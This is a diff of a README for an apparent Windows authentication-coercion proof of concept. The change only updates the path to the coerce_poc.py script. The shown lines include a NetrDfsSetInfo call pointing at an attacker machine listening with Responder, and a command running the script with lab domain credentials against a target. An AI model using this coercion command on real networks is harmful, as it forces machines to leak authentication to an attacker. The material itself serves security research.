@@ -27,10 +27,10 @@ The IP 192.168.2.51 being my attacking machine where I listen with Responder, an
 NetrDfsSetInfo('192.168.2.51\x00')
 ```
 
-We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):
+We can try this with this proof of concept code ([coerce_poc.py](./poc/python/coerce_poc.py)):
 
 ```bash
-./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
+./poc/python/coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
 ```
 
 ![](./imgs/poc.png)
